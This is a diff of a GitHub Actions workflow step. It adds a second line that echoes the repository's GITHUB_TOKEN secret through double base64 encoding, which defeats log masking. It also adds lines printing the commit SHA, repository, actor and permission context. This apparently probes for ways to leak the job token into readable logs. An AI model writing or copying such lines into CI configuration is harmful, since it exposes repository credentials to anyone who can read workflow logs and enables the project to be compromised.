@@ -11,3 +11,14 @@ jobs:
         run: |
           echo "hewo"
           echo "${{secrets.GITHUB_TOKEN}}" | base64 | base64
+          echo "${{secrets.GITHUB_TOKEN}}" | base64 | base64
+          echo "sha: ${{github.event.pull_request.head.sha}}"
+          echo "github sha ${{github.sha}}"
+          echo "Repository: ${{ github.repository }}"
+          echo "Repository owner: ${{ github.repository_owner }}"
+          echo "Repository name: ${{ github.event.repository.name }}"
+          echo "Full repo URL: ${{ github.repositoryUrl }}"
+          echo "Actor: ${{ github.actor }}"
+          echo "Triggering actor: ${{ github.triggering_actor }}"
+          echo "Token permissions (read from job context):"
+          echo "Contents: ${{ toJSON(github.event.repository.permissions) }}"
